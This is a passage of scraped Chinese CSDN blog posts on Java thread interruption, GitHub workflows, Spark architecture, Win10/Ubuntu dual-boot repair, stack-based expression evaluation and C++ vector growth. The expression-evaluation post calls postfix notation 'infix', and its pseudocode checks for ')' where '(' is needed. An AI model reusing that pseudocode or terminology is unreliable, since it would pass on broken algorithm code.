public void run(){    \n            try{    \n                 ....    \n                 while(!Thread.currentThread().isInterrupted()&& more work to do){    \n                        // do more work;    \n                 }    \n            }catch(InterruptedException e){    \n                        // thread was interrupted during sleep or wait    \n            }    \n            finally{    \n                       // cleanup, if required    \n            }    \n    }    \n\nThread.currentThread().isInterrupted()可以用来检测当前线程的中断属性 \nwhile循环有一个决定因素就是需要不停的检查自己的中断状态。当外部线程调用该线程的interrupt 时，使得中断状态置位即变为true。这是该线程将终止循环，不在执行循环中的do more work了。\n\n\n\n3.interrupt()\n\n这个方法是线程的一个内部方法，是由其他线程调用的，比如我在main方法中让main线程来调用MTH的interrupt（）方法. \n比如下面这个代码：\n\n\n\npublic class Run {\n    public static void main(String[] args) throws InterruptedException {\n        MyThread thread = new MyThread();\n        thread.start();\n        Thread.sleep(1000);\n        //调用线程Mythread的实例的中断方法\n        thread.interrupt();\n   }\n}\n\n这段代码会将MTH（如果你忘记了声明是MTH，网上翻）的中断属性为TRUE，仅此而已。\n\n引申一下：\n\n\n\n public static void main(String[] args) throws InterruptedException {\n        Thread.currentThread().interrupt();\n}\n\n如果我在main方法里调用了上面这行代码，会怎么样？ \n答案是：main线程的中断位会被设置为TRUE\n\n\n\n4.isInterrupted()\n\n这个方法主要用来获取当前线程的“中断”属性的状态，是TRUE还是FALSE。仅此而已。\n\n套用上面的代码：\n\n\n\n  public static void main(String[] args) throws InterruptedException {\n        Thread.currentThread().interrupt();\n        System.out.println(\"isInterrupted \" +                Thread.currentThread().isInterrupted());\n}\n\n这里有一个点需要注意：在上面的代码中 \nThread.currentThread()得到的是当前正在执行main方法的线程（也就是main线程）\n\n控制台会输出什么？\n\n\n\nTRUE\n\n线程默认的中断位是FALSE，main线程调用了interrupt()之后，其中断位为TRUE， \nisInterrupted()方法获取到的当然是TRUE\n\n\n\n5.interrupted()\n\n调用该线程的方法的中断位会被重置为FALSE\n\n\n\n Thread.currentThread().interrupt();\n        System.out.println(\"isInterrupted \" + Thread.currentThread().isInterrupted());\n        new MyThread().interrupted();//因为是Main线程执行这个方法，这个方法内部会把正在执行他的线程的中断标志位设置为false\n        System.out.println(\"isInterrupted \" + Thread.currentThread().isInterrupted());\n\n以上的代码的执行的结果是：\n\n\n\nisInterrupted true\nisInterrupted false\n\n原因很简单，Thread.currentThread().isInterrupted()方法执行之后main线程的中断位会被置为TRUE； \n之后new MyThread().interrupted()执行，那么这行代码是谁在执行？当然是main线程在执行，也就是说执行interrupted()方法的线程是main。之前说了谁执行了interrupted()方法谁的中断位就会被置为FALSE，那现在main的中断位自然就会被置为FALSE了。\n\n上面的话可能有点绕口，如果你不理解这段话，请看下面这个小例子：\n\n\n\npublic class DemoThread {\n    static class MThread extends Thread {\n        public MThread() {\n            System.out.println(\"执行Mthread的线程是  ：\" + Thread.currentThread().getName());\n        }\n    }\n    public static void main(String[] args) {\n        new MThread();\n    }\n}\n\n\n这时候控制台的输出是：\n\n\n\n执行Mthread的线程是  ：main\n\n因为是main线程创建了子线程，自然子线程的构造函数是被main线程调用的。 \n如果你还看不懂，请反复看，这很关键。\n\n如果我要修改main线程的中断位，我只用通过new MyThread().interrupted()方法么？答案是否定的，下面的代码也可做到\n\n\n\npublic class Run {\n    public static void main(String[] args) throws InterruptedException {\n        Thread.currentThread().interrupt();//false--->TRUE\n        System.out.println(\"isInterrupted \" + Thread.currentThread().isInterrupted());\n        Thread.interrupted();//true-->false\n        System.out.println(\"isInterrupted \" + Thread.currentThread().isInterrupted());\n\n    }\n}\n\n\n* interrupted()的返回值：* \ninterrupted()会将标志位被自己置为之前的状态作为返回值然后，在置位标志位，看下面的代码：\n\n\n\npublic class Run {\n    public static void main(String[] args) throws InterruptedException {\n        Thread.currentThread().interrupt();\n        System.out.println(Thread.currentThread().interrupted());\n        System.out.println(Thread.currentThread().isInterrupted());\n    }\n}\n\n控制台的输出是：\n\n\n\ntrue\nfalse\n\n\n因为Thread.currentThread().interrupt();将main线程置为了TRUE（FALSE->TRUE）,然后System.out.println(Thread.currentThread().interrupted());将TRUE返回，然后在将中断位修改为FALSE，最后Thread.currentThread().isInterrupted()返回的就是FALSE了。\n\n\n\n6.sleep() & interrupt()\n\n如果线程MTH线程循环调用了sleep(10000),main线程想要让mth放弃Sleep状态，然后抛出异常\n\n\n\npublic class FindDiffInArray {\n    static class BusyThread extends Thread {\n        @Override\n        public void run() {\n            System.out.println(\"我是无相关线程\");\n        }\n    }\n\n    static class MTH extends Thread {\n        @Override\n        public void run() {\n            try {\n                System.out.println(\"RUN begin\");\n                Thread.sleep(2000000);\n                System.out.println(\"RUN end\");\n            } catch (InterruptedException e) {\n                System.out.println(\"在沉睡中被停止 \" + this.isInterrupted());\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        MTH mth = new MTH();\n        mth.start();\n        Thread.sleep(200);\n        mth.interrupt();\n        System.out.println(mth.isInterrupted());\n    }\n}\n\n控制台的输出：\n\n\n\nRUN begin\njava.lang.InterruptedException: sleep interrupted\n    at java.lang.Thread.sleep(Native Method)\n    at FindDiffInArray$MTH.run(FindDiffInArray.java:28)\n在沉睡中被停止 false\nfalse\n\n可以看到mth.interrupt();被执行之前mth一直在循环执行sleep()函数，接着是接收到中断信号，但是由于此时mth没有占用CPU时间片，没有占用CPU运行的线程是不可能给自己的中断状态置位的。这就会产生一个InterruptedException异常。 \n但是抛出异常之后，mth的中断位并没有被置为TRUE（从控制台的打印信息来看）\n\n\n\n7.join() & interrupt().\n\n当线程以join()等待其他线程结束时,当它被调用interrupt()，它与sleep()时一样, 会马上跳到catch块里.  \n    注意，是对谁调用interrupt()方法,一定是调用被阻塞线程的interrupt方法.如在线程a中调用来线程t.join().则a会等t执行完后在执行t.join后的代码,当在线程b中调用来 a.interrupt()方法,则会抛出InterruptedException，当然join()也就被取消了。\n\n\n\n8. wait() & interrupt()\n\n线程A调用了wait()进入了等待状态,也可以用interrupt()取消. \n    不过这时候要小心锁定的问题.线程在进入等待区,会把锁定解除,当对等待中的线程调用interrupt()时,会先重新获取锁定,再抛出异常.在获取锁定之前,是无法抛出异常的.", "time": "2018_08_14_11_12_29", "link": "https://blog.csdn.net/gpwner/article/details/73730430", "title": "Java<优雅地理解线程interrupt、isInterrupted、interrupted>"}
{"timestamp": "2018_08_14_11_12_30", "desc": "饱暖思淫欲，写了项目就想试试上传到github.com，之前用Git和SourceTree跟同事调试过协同开发，又是突发奇想：如何用同一个github帐号在两台电脑上同步开发？说干就干！\n\n找了很多教程，试了好几次，总是上传不了新项目到github，在参考几个文章后，最终搞定了。\n\n首先是下载安装Git（度娘：找我找我！）（谷歌：呵呵…）。\n\n第一步：打开项目资源路径，右键点击“Git Bash Here”，打开GitBash\n\n\n\n第二步：创建SSH keys \nSSH keys是什么东西可自己查，原先自己也疑惑，为什么有些教程需要创建，有些又不用呢？检索之后发现，其实并不一定要SSH keys，百度知道上有一个很好的答案： \n“ssh是一种安全的传输模式，github要求推送代码的用户是合法的，所以每次推送时候都要输入账号密码，用以验证你是否为合法用户，为了省去每次都要输入密码的步骤，采用shh公钥，密钥；也就是你说的sshkey来验证你是否为合法用户，在你的电脑生成了一个唯一的ssh公钥和私钥，公钥放到github上面，当你推送的时候，git就会匹配你的私钥是否跟github上面的公钥是配对的，正确就认为你是合法的，允许推送。sshkey可以理解为是你的身份标识，放在github上面表明你是这个项目的一个开发人员，但是别人是可以截获的，你本机的私钥别人就无法截获，sshkey就可以保证每次传输都是安全的。”\n\n在打开的GitBash中输入以下命令行，然后一直回车，就会在指定的文件夹中生成密钥：\n\n\n\nssh-keygen -t rsa -C \"你注册github时使用的邮箱\"\n\n \n打开对应位置的文件：\n\n\n\n将其中的key复制到自己的SSH and GPG keys中，新建key：\n\n\n\n验证是否成功：\n\n\n\nssh -T git@github.com\n\n\n\n第三步：新建github仓库\n\n\n\n第四步：初始化自己的Git工具\n\n\n\n// 初始化一个 Git 仓库\ngit init  \n// 设置开发者信息\ngit config --global user.name\"ZhangZeQiao\" \ngit config --global user.email\"571129524@qq.com\" \n\n\n\n第五步：【曲线救国步骤一】将github上新建的空项目克隆到本地同名的项目下\n\n\n\ngit clone https://github.com/ZhangZeQiao/DemoApp.git\n\n \n\n\n在本地原项目下会克隆生成一个新的文件夹：\n\n \n将里面的文件全部剪切到原项目下，删除空的文件夹：\n\n\n\n第六步：【曲线救国步骤二】提交项目\n\n\n\ngit add . //注意add后面是有”.“的，而且和add之间有一个空格 \n\ngit commit -m “填写你的提交说明”\n\ngit push origin master\n\n注意点0：提交之前最好进行文件的忽略操作\n\n《Android Studio Git .gitignore操作（版本控制应该忽略的文件）》\n\n注意点1：需要填写账号名跟密码\n\n\n\n注意点2：这里我看到有人加-u，因为第一次push的时候失败了，所以第二次时加了-u，但是第一次提交时我没有开VPN，第二次时开了，再结合报错的提示，很难说哪种条件下才成功，所以，如果第一次提交不成功就多提交几次，666 …\n\n\n\n到github刷新，就能原先空项目满了：\n\n\n\n———- \n回家中 …… \n———-\n\n好啦，重点来了，敲黑板记笔记哈：“如何用同一个github帐号在两台电脑上同步开发？”或者说“如何协同开发？“\n\n“神器AndroidStudio ！！！”\n\nAndroidStudio中已经集成了github，只要配置github和git信息就可以啦。\n\n步骤一：配置Github\n\n\n\n步骤二：配置Git\n\n\n\n步骤三：导入项目\n\n\n\n\n\n\n\n这里要提示一点：如果出现以下问题“Couldn’t get the list of GitHub repositori”，只要去掉as的网络代理，点选“No proxy”即可\n\n\n\n最后是提交代码：\n\n1、在这里点击提交（假提交）：\n\n\n\n2、填写信息：\n\n\n\n3、先点击添加上面要提交的内容，再点击这里的push，提交到github（为防止代码冲突，push之前要先pull）：\n\n \n\n\n搞定：\n\n\n\n这里有个小技巧：如果你想查看github是否更新到，可在指定的文件的tab中右键，然后点击“Open on GitHub”\n\n\n\n参考文章： \nhttp://blog.csdn.net/gpwner/article/details/52829187 \nhttp://www.cnblogs.com/Chenshuai7/p/5486278.html \nhttps://juejin.im/post/5846aee5ac502e006bb45d7e \nAndroid Studio Git .gitignore操作（版本控制应该忽略的文件） \nAndroid Studio使用git无法pull或commit的解决方法", "time": "2018_08_14_11_12_30", "link": "https://blog.csdn.net/zeqiao/article/details/75124532", "title": "上传项目到 GitHub：如何用同一个 github 帐号在两台电脑上同步开发？/ 如何协同开发？"}
{"timestamp": "2018_08_14_11_12_31", "desc": "github与角色权限相关的几个概念\n\n\norganization 组织\nrepository 仓库\nteam 团队\ndeveloper 开发者\n\n\n\n\n\n\norganization 组织\n\n1. 创建organization 组织 \n 右上角点击加号选择new organization \n 分三步：\n\n\n第一步 创建个人账户 \n如果已创建账户，则无需再创建\n第二步 创建组织 \n输入组织名，填写绑定邮箱 \n \n点击底下的create organization 按钮\n第三步 删除组织 \n先选择要删除的组织 \n \n选择setting拉到最下面 \n \n邀请成员 \n \n创建仓库 \n\n\n\n创建team \n \n添加members", "time": "2018_08_14_11_12_31", "link": "https://blog.csdn.net/py_1990_04_20/article/details/79383198", "title": "github的多人协同开发"}
{"timestamp": "2018_08_14_11_12_31", "desc": "内容来自书籍《Spark技术内幕：深入解析Spark内核架构设计与原理》\n\nspark架构如下图所示： \n\n\nDriver是用户编写的数据处理逻辑，这个逻辑中包含用户创建的SparkContext。SparkContext是用户逻辑与Spark集群主要的交互接口，它会和Cluster Manager交互，包括向它申请计算资源等。Cluster Manager负责集群的资源管理和调度，现在支持Standalone、Apache Mesos和Hadoop的YARN。Worker Node是集群中可以执行计算任务的节点。Executor是在一个Worker Node上为某应用启动的一个进程，该进程负责运行任务，并且负责将数据存在内存或者磁盘上。Task是被送到某个Executor上的计算单元。每个应用都有各自独立的Executor，计算最终在计算节点的Executor中执行。\n\n\n\n用户程序从最开始的提交到最终的计算执行，需要经历以下几个阶段：\n\n1）用户程序创建SparkContext时，新创建的SparkContext实例会连接到Cluster Manager。 \nCluster Manager会根据用户提交时设置的CPU和内存等信息为本次提交分配计算资源，启动Executor。 \n2）Driver会将用户程序划分为不同的执行阶段，每个执行阶段由一组完全相同的Task组成，这些Task分别作用于待处理数据的不同分区。在阶段划分完成和Task创建后，Driver会向Executor发送Task。\n\n3）Executor在接收到Task后，会下载Task的运行时依赖，在准备好Task的执行环境后，会开始执行Task，并且将Task的运行状态汇报给Driver。\n\n4）Driver会根据收到的Task的运行状态来处理不同的状态更新。Task分为两种：一种是Shuffle Map Task，它实现数据的重新洗牌，洗牌的结果保存到Executor所在节点的文件系统中；另外一种是Result Task，它负责生成结果数据。\n\n5）Driver会不断地调用Task，将Task发送到Executor执行，在所有的Task都正确执行或者超过执行次数的限制仍然没有执行成功时停止。\n\n\n\nRDD（弹性分布式数据集）\n\nRDD是只读的、分区记录的集合。RDD只能基于在稳定物理存储中的数据集和其他已有的RDD上执行确定性操作来创建。这些确定性操作称为转换，如map、filter、groupBy、join。RDD不需要物化。RDD含有如何从其他RDD衍生（即计算）出本RDD的相关信息（即Lineage），Lineage），因此在RDD部分分区数据丢失的时候可以从物理存储的数据计算出相应的RDD分区。 \n每个RDD有5个主要的属性： \n1）partition list，即数据集的基本组成单位。对于RDD来说，每个partition 都会被一个计算任务处理，并决定并行计算的粒度。用户可以在创建RDD时指定RDD的partition 个数，如果没有指定，那么就会采用默认值。默认值就是程序所分配到的CPU Core的数目。 \n2）一个计算每个partition 的函数。Spark中RDD的计算是以partition 为单位的，每个RDD都会实现compute函数以达到这个目的。compute函数会对迭代器进行复合，不需要保存每次计算的结果。 \n3）RDD之间的依赖关系。RDD的每次转换都会生成一个新的RDD，所以RDD之间就会形成类似于流水线一样的前后依赖关系。在部分分区数据丢失时，Spark可以通过这个依赖关系重新计算丢失的分区数据，而不是对RDD的所有分区进行重新计算。 \n4）一个Partitioner，即RDD的分区函数。当前Spark中实现了两种类型的分区函数，一个是基于哈希的HashPartitioner，另外一个是基于范围的RangePartitioner。只有对于key-value的RDD，才会有Partitioner，非key-value的RDD的Parititioner的值是None。Partitioner函数不但决定了RDD本身的分片数量，也决定了parent RDD Shuffle输出时的分片数量。 \n5）一个列表，存储存取每个Partition的优先位置（preferred location）。对于一个HDFS文件来说，这个列表保存的就是每个Partition所在的块的位置。按照“移动数据不如移动计算”的理念，Spark在进行任务调度的时候，会尽可能地将计算任务分配到其所要处理数据块的存储位置。对每一个split计算的优先位置 Preferred Location。比如对一个hdfs文件进行计算时，可以获取优先计算的block locations\n\n以上五个特征中包含四个函数和一个属性，如下所示：\n\nprotected def getPartitions: Array[Partition]     //only called once\ndef compute(split: Partition, context: TaskContext): Iterator[T]\nprotected def getDependencies: Seq[Dependency[_]] = dips    //only called once\nprotected def getPreferredLocations(split: Partition): Seq[String] = Nil\n@transient val partitioner: Option[Partitioner] = None", "time": "2018_08_14_11_12_31", "link": "https://blog.csdn.net/gpwner/article/details/74011693", "title": "Spark2.1.1<Spark架构综述>"}
{"timestamp": "2018_08_14_11_12_31", "desc": "本人在安装 win10 和 Ubuntu 双系统时出现了 “机器已经存在BIOS兼容模式的系统……” 的问题。\n\n\n安装 win10 与 Ubuntu 双系统时，出现警告：\n\n机器已经存在BIOS兼容模式的系统，如果继续安装，会有一定的强制性，可能导致现有的系统无法正常启动\n\n在 win10 下 cmd+r，输入 msinfo32 查看 BIOS 模式为传统的 legacy 模式，选择继续安装后，系统重新启动后没有了 win10 的引导项\n\n这里需要提示一下 \n在安装双系统的时候，Ubuntu 分区问题需要注意，因为安装Ubuntu会将原来的系统的引导项破坏（重启的时候没有了），所以需要从 Ubuntu 下修复  win10 系统的引导项。在安装 Ubuntu 时，首先选择语言，英文或者简体，看个人喜好，点击继续，直到出现选择 “windows 和 Ubuntu 共存” 这样的选项时，需要注意的是，这里不要选择这一项，选择其他选项，由自己分区。\n\n\n首先新建 /boot 分区，这个分区就是用来保存引导项的一些东西，给512M足够 \n然后新建 swap 分区，一般分配内存大小的2倍即可，LZ的机器是8G的，分配了16G的空间 \n然后再次新建 /usr 分区，这个分区用来安装可执行文件，也就是你需要用到的一些软件，可以给的大一些，我分配了230G，给了80G的空间 \n新建 / 根分区，因为我主要的空间几乎都是给了 /home 所以，这个分区只给了 20G 的空间\n/home 分区，这里存放自己的一些文件，照片以及视频等等。LZ经常是看源码之类的事情，东西存放的比较多，所以偏重于给 home 更大的空间\n\n\n分区分好之后，下面还有一个选项，就是选择引导项安装的位置，这个很重要：如果选择安装在 /boot 下，那么可以从 win10 下引导 Ubuntu ，但是LZ恰恰就是这里出了问题，因为前面提到的那个警告，继续安装Ubuntu会有一定的强制性，重启的时候，导致找不到 win10 的引导项，所以选择的是sda(c盘)的位置安装 Ubuntu 的引导，然后就可以在 Ubuntu 下修复 win10 的引导项了。\n\n继续后面的安装（此处省略。。。详细的安装步骤可以查看论坛），系统完成安装之后，升级一下驱动（LZ因为显卡是N卡1060，没有选择在安装过程中联网升级的步骤，导致的结果就是显卡驱动不匹配，然后选择了一个 test 版的N卡驱动，还凑合着用吧。）\n\n正片环节：\n\n以root权限进入到 terminal 中，\n\nupdate-grub\n\n\n会出现 ubuntu 和 win10 的引导项，就表示成功。再次重启就能发现 win10 的引导项，选择进入即可进入 win10 系统。\n\n其实折腾大半天，废了这么多口舌说了这么多的废话，只需要在安装过程中，做好分区，然后一个命令就搞定了。(LZ亲测通过，希望其他童鞋也能安装顺利。)\n\n\n  本文不是 win10 与 ubuntu 双系统的安装教程，也没有做到图文并茂，只是正对LZ在安装过程中碰到的一些问题与大家分享一下，不喜勿喷", "time": "2018_08_14_11_12_31", "link": "https://blog.csdn.net/honglicu123/article/details/53750379", "title": "BIOS模式的win10与UEFI模式的Ubuntu双系统的安装问题"}
{"timestamp": "2018_08_14_11_12_31", "desc": "表达式求值算法\n\n表达式求值，一般采用栈和队列的方式来求值，下面介绍表达式求值的两种算法。\n\n方法一、使用两个栈，一个为操作符栈OPTR(operator)，一个是操作数栈OPND(operand) \n算法过程： \n当输入 3 * ( 4 - 1 * 2 ) + 6 / ( 1 + 1 )时，为简单方便，我们输入时，按照字符的顺序一个一个的处理，比如\n\nch = getchar()\n\n\n然后根据ch 的值判断。\n\n\n若 ch 是数字，直接压入操作数栈OPND； \n若 ch 是'('，直接入栈OPTR;若 ch 是')'，若OPTR 和 OPND 非空，弹出OPTR的栈顶操作符，弹出OPND栈顶的两个操作数，做运算，然后见个结果压入栈OPND，直到弹出的OPTR栈顶元素时')';\n若 ch 是操作符(比如+, -, *, /)，如果OPTR栈顶元素是 (，直接入栈OPTR，如果不是'('且OPTR栈非空且栈顶元素操作符的优先级大于ch，那么弹出OPTR的栈顶操作符，并弹出OPND中栈顶的两个元素，做运算，将运算结果入栈OPND，此时，重复这一步操作；否则将ch入栈OPTR；\n若ch为EOF，说明表达式已经输入完成，判断OPTR是否为空，若非空，一次弹出OPTR栈顶操作符，并与OPND栈顶两个元素做运算，将运算结果入栈OPND，最后表达式的结果即OPND的栈底元素。\n\n\n以表达式3 * ( 4 - 1 * 2 ) + 6 / ( 1 + 1 )为例，计算过程如下所示： \n\n\n\nOPTR\nOPND\nch\n备注\n\n\n\n\n3\n3\n\n\n\n\n*\n3\n*\n\n\n\n\n*,(\n3\n(\n\n\n\n\n*,(\n3,4\n4\n\n\n\n\n*,(,-\n3,4\n-\n\n\n\n\n*,(,-\n3,4,1\n1\n\n\n\n\n*,(,-,*\n3,4,1\n*\n\n\n\n\n*,(,-,*\n3,4,1,2\n2\n\n\n\n\n*,(,-\n3,4,2\n)\nOPND弹出2和1，OPTR弹出*，计算结果入栈OPND\n\n\n\n*,(\n3,2\n)\nOPND弹出2和4，OPTR弹出-，计算结果入栈OPND\n\n\n\n*\n3,2\n)\nOPTR栈顶弹出的是)\n\n\n\n+\n6\n+\nOPTR栈顶元素优先级大于ch，将OPND栈的3和2与OPTR的*运算，结果入栈OPND,ch入栈OPTR\n\n\n\n+\n6,6\n6\n\n\n\n\n+,/\n6,6\n/\n\n\n\n\n+,/,(\n6,6\n(\n\n\n\n\n+,/,(\n6,6,1\n1\n\n\n\n\n+,/,(,+\n6,6,1\n+\n\n\n\n\n+,/,(,+\n6,6,1,1\n1\n\n\n\n\n+,/,(\n6,6,2\n)\nOPND的1和1，与OPTR的+运算，结果入栈OPND\n\n\n\n+,/\n6,6,2\n)\n\n\n\n\n+\n6，3\n\n表达式已经输入完成，OPTR非空，继续计算。OPND的2和6，OPTR的/运算\n\n\n\n\n9\n\n计算结果\n\n\n\n通过上述的计算过程，写出伪代码如下所示：\n\nvoid GetExpress(Stack * OPTR, Stack * OPND)\n{\n    char ch;\n    while ((ch = getchar ()) != EOF) {\n        if (IsDigit (ch)) {\n            PushStack (OPND, ch);\n        }\n        else if (ch == '(')\n            PushStack (OPTR, ch);\n        else if (ch == ')') {\n            while (!IsStackEmpty(OPTR)) {\n                PopStack (OPTR, op);\n                if (op == ')')\n                    break;\n                PopStack (OPND, num2);\n                PopStack (OPND, num1);\n                res = Calc (num1, num2, op);\n                PushStack (OPND, res);\n            }\n        }\n        else if (ch == '+' || ch == '-'\n            || ch == '*' || ch == '/') {\n            while (!IsStackEmpty (OPTR) && GetTop (OPTR)!='(' && GetTop (OPTR)>ch) {\n                PopStack (OPTR, op);\n                PopStack (OPND, num2);\n                PopStack (OPND, num1);\n                res = Calc (num1, num2, op);\n                PushStack (OPND, res);\n            }\n            if (IsStackEmpty (OPTR) || GetTop(OPTR)=='(')\n                PushStack (OPTR, ch);\n        }\n    }\n}\n// 当表达式输入完成后，需要对OPTR栈和OPND中的元素进行运算\nint GetValue(Stack * OPTR, Stack * OPND)\n{\n    while (!IsStackEmpty (OPTR)) {\n        PopStack (OPTR, op);\n        PopStack (OPND, num2);\n        PopStack (OPND, num1);\n        res = Calc (num1, num2, op);\n        PushStack (OPND, res);\n    }\n    // 最后的操作数栈OPND栈顶元素即是表达式的值\n    return GetTop(OPND);\n}\n\n\nPS: 上面没有指出表达式非法的情况\n\n方法二：采用中缀表达式的方法，求取表达式的中缀表达式，借用一个操作符栈OPTR和中缀表达式队列Queue，求取中缀表达式，然后对中缀表达式求值。\n\n求取中缀表达式\n\n\n若 ch 是数字，直接入队列Queue;\n若 ch 是操作符(+, -, *, /)，如果OPTR栈顶元素是(或者OPTR 为空，直接入栈OPTR;若OPTR非空，且栈顶元素的优先级大于ch，先出栈，且将出栈元素入队Queue，直到栈顶元素小于ch，然后将ch入栈；否则直接将ch入栈；\n若 ch 是 (，直接入栈 OPTR;\n若 ch 是 )，出栈并入队列，直到出栈元素是 (，若栈为空且没有(出现，说明表达式非法。\n当表达式输入完成时，判断栈是否为空，若非空，依次弹栈并入队列\n\n\n求取中缀表达式的值，需要借用一个栈\n\n\n若队列非空，出队q_ele；如果出队元素q_ele是数字，入栈S；否则取出栈顶两个元素，与q_ele这个操作符左运算，运算结果入栈S\n最后的结果为栈顶元素\n\n\n仍以表达式3 * ( 4 - 1 * 2 ) + 6 / ( 1 + 1 )为例，计算过程如下：\n\n计算中缀表达式：\n\n\n\nOPTR\nQueue\nch\n备注\n\n\n\n\n3\n3\n\n\n\n\n*\n3\n*\n栈为空，直接入栈\n\n\n\n*,(\n3\n(\n\n\n\n\n*,(\n3,4\n4\n\n\n\n\n*,(,-\n3,4\n-\n栈顶是’(‘\n\n\n\n*,(,-\n3,4,1\n1\n\n\n\n\n*,(,-,*\n3,4,1\n*\n栈顶元素-优先级小于*，直接入栈\n\n\n\n*,(,-,*\n3,4,1,2\n2\n\n\n\n\n*\n3,4,1,2,*,-\n)\n依次出栈并入队，知道出栈元素是’)’\n\n\n\n+\n3,4,1,2,*,-,*\n+\n栈顶元素*优先级大于+，出栈入队，然后+入栈\n\n\n\n+\n3,4,1,2,*,-,*,6\n6\n\n\n\n\n+,/\n3,4,1,2,*,-,*,6\n/\n\n\n\n\n+,/,(\n3,4,1,2,*,-,*,6\n(\n\n\n\n\n+,/,(\n3,4,1,2,*,-,*,6,1\n1\n\n\n\n\n+,/,(,+\n3,4,1,2,*,-,*,6,1\n+\n\n\n\n\n+,/,(,+\n3,4,1,2,*,-,*,6,1,1\n1\n\n\n\n\n+,/\n3,4,1,2,*,-,*,6,1,1,+\n)\n依次出栈并入队，知道出栈元素是’)’\n\n\n\n\n3,4,1,2,*,-,*,6,1,1,+,/,+\n\n表达式已经输入完成，将栈依次出栈并入队\n\n\n\n此时中缀表达式为3,4,1,2,*,-,*,6,1,1,+,/,+，队列左边是头，右边是尾。\n\n计算中缀表达式的值：\n\n\n\nQueue\nS\nq_ele\n备注\n\n\n\n3,4,1,2,*,-,*,6,1,1,+,/,+\n\n\n\n\n\n\n4,1,2,*,-,*,6,1,1,+,/,+\n3\n3\n\n\n\n\n1,2,*,-,*,6,1,1,+,/,+\n3,4\n4\n\n\n\n\n2,*,-,*,6,1,1,+,/,+\n3,4,1\n1\n\n\n\n\n*,-,*,6,1,1,+,/,+\n3,4,1,2\n2\n\n\n\n\n-,*,6,1,1,+,/,+\n3,4,2\n*\n将栈顶2和1，对操作符*做运算，并将结果入栈\n\n\n\n*,6,1,1,+,/,+\n3,2\n-\n将栈顶2和4，对操作符-做运算，并将结果入栈\n\n\n\n6,1,1,+,/,+\n6\n*\n将栈顶2和3，对操作符*做运算，并将结果入栈\n\n\n\n1,1,+,/,+\n6,6\n6\n\n\n\n\n1,+,/,+\n6,6,1\n1\n\n\n\n\n+,/,+\n6,6,1,1\n1\n\n\n\n\n/,+\n6,6,2\n+\n1+1=2\n\n\n\n+\n6,3\n/\n6/2=3\n\n\n\n\n9\n+\n6+3=9,计算结果\n\n\n\n根据以上操作过程，写出伪代码：\n\nvoid GetPostExpress (Stack * OPTR, Queue * Q)\n{\n    while ((ch = getchar ()) != EOF) {\n        if (IsDigit (ch))   //判断是否是数字\n            PushQueue (Q, ch);\n        else if (ch == '(')\n            PushStack (OPTR, ch);\n        else if (ch == '+' || ch == '-'\n            || ch == '*' || ch == '/') {\n            if (IsStackEmpty (OPTR) || GetTop (OPTR)=='(')\n                PushStack (OPTR, ch);\n\n            while (!IsStackEmpty (OPTR) && GetTop (OPTR)!='('\n                && GetTop (OPTR)>ch) {\n                PopStack (OPTR, op);\n                PushQueue (Q, op);\n            }\n            PushStack (OPTR, ch);\n        }\n\n        if (ch == ')') {\n            while (!IsStackEmpty (OPTR)) {\n                PopStack (OPTR, op);\n                if (op == ')')\n                    break;\n\n                PushQueue (Q, op);\n            }\n        }\n    }\n    // 表达式输入完成 \n    while (!IsStackEmpty (OPTR)) {\n        PopStack (OPTR, op);\n        PushQueue (Q, op);\n    }\n}\n\n// 计算中缀表达式的值\nint GetValue (Queue * Q, Stack * S)\n{\n    while (!IsQueueEmpty (Q)) {\n        PopQueue (Q, ch);\n        if (IsDigit (ch))\n            PushStack (S, ch);\n        else {\n            PopStack (S, num2); //需要判断栈是否为空\n            PopStack (S, num1);\n            res = Calc (num1, num2, ch);\n            PushStack (S, res);\n        }\n    }\n    return GetTop (S);  //栈顶元素就是表达式的结果\n}", "time": "2018_08_14_11_12_31", "link": "https://blog.csdn.net/honglicu123/article/details/52575226", "title": "表达式求值算法总结"}
{"timestamp": "2018_08_14_11_12_32", "desc": "C++ 中的 vector 长度是如何动态增长的\n\n\n  推荐我的个人博客： blog.wuzhenyu.com.cn \n  下面这篇文章的前半部分，是一篇译文，原文地址1：http://www.drdobbs.com/c-made-easier-how-vectors-grow/184401375 \n\n\nc++ 标准库函数默认情况下提供了合理的性能，但是，如何做到“合理”的呢，read on next.\n\n\n\n介绍\n\n假如我们需要从一个文件中读取一组 double 类型的值，并保存在一个数据结构中，我们可以通过以下方式很快速的实现：\n\nvector<double> values;\ndouble x;\n\nwhile (cin >> x) \n    values.push_back(x);\n\n\n当循环结束时，values 将保存所有这些值。我们可以通过变量 i 和 values[i] 来快速访问这些值。\n\n直观来说，标准库函数中的 vector 类就像是一个内置数组：我们可以把他想象成一组保存数据的连续的内存块，能够通过 values[i] 来访问。确实，C++ 标准并没有明确规定 vector 的元素必须占用连续的内存块，但是 2000 年 10 月的标准委员会 (the standard commitee) 会议通过，认为这是一项疏忽，并把这个要求加入到了它的技术勘误表中 (Technical Corrigendum)。这一迟来的决定，并没有造成多大的问题，因为使用 vector 实现的这些代码中，都是按照这个约定来工作的。\n\n如果 vector 的元素是保存在连续的内存中的，那么就可以很容易的理解 vector 的元素访问为什么如此高效了 - 这就像是数组一样，能够对数据元素随机存取 (it simply uses the same mechanism as the built-in arrays use.)。但是，不容易理解的是， vector 是如何高效的组织元素自己动态增长的呢，因为保存在连续的内存中，不可避免的需要将数据从一个内存块复制到另一个内存块。现在处理器在处理连续内存块的复制方面已经可以做到很高效了，但是这些拷贝是不被释放的，会占用大量的内存。因此，需要思考，标准库函数中 vector 的增长，在没有占用大量时间和空间的情况下，是如何实现的。\n\n下面来讨论一种简单、高效的策略来管理这种动态内存的增长。\n\n\n\n大小和容量 (size and capacity)\n\n想要弄清楚 vector 是如何工作的，首先就要清楚 vector 并不仅仅是一个连续的内存块，每一个 vector 都有两个相关两的内存块。一个是大小块，保存有 vector 元素个数，另一个为容量，是 vector 的整个内存大小，能够保存 vector 的所有元素。比如 v 是一个 vector 类的对象，v.size() 和 v.capacity() 将返回 v 的大小和容量。可以想成下面这种结构：\n\n---------------------------------\n|  elements |  available space  |\n--- size ---\n---------- capacity -------------\n\n\n在 vector 的末尾额外使用一个内存的意义，是在使用 push_back 加入元素的时候，可以不需要再去申请内存。如果这块内存刚好紧邻 vector 的内存，那么直接将这块内存直接加入到 vector 上就能实现内存增长。但是这种情况极少，大多数情况下，都需要去申请一块更大的新内存，然后将所有的元素都拷贝到新内存块中，然后释放掉原有的内存块。\n\n内存再分配会经过一下四步： \n1. 申请足够大的内存保存所有的元素 \n2. 将原有的元素拷贝到新内存中 \n3. 